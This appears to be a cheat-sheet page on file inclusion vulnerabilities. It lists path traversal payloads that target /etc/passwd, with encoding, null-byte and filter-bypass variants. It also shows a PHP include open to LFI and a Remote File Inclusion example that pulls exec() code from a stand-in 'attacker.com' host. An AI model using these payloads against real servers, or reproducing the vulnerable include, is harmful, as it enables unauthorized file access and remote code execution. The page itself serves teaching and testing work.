# 📁 File inclusion

A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories.

There are three main types of file inclusion vulnerabilities:

- Path traversal
- Local File Intrusion (LFI)
- Remote File Inclusion (RFI)

## Path traversal

The attacker can access files in other directories of the server.
Usually, this type of attack is based on dot-dot-slash notation.

```bash
# basic dot-dot-slash notation
../../../etc/passwd

# ascii version
%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

# truncate string (PHP < 5.3.4) using null byte
# useful when something is appended like ".php"
../../../etc/passwd0x00
../../../etc/passwd%00
../../../etc/passwd\0

# if validation is done over the first match of the string 'etc' and what is right after
../../../etc/../etc/passwd

# if '/etc/passwd' is filtered
../../../etc/./passwd

# if '../' is removed
....//....//....//....//....//etc/passwd
```

## LFI

In Local File Intrusion (LFI) the attacker makes the server to include other local script files.

The main difference with path traversal is the execution of scripts decided by the attacker.

In PHP this could happen with functions like `include`, `required`, `include_once`, and `required_once`.

```php
<?php
  include("./pages/".$_GET["page"]);
?>
```

## RFI

In Remote File Inclusion (RFI) the attacker makes the server to include other script files from external sources.

For example, the function `include` can also import external sources:

```php
<?php
  include("http://attacker.com/inject.php");
?>
```

```php title="inject.php"
<?php
  print(exec("hostname"));
?>
```
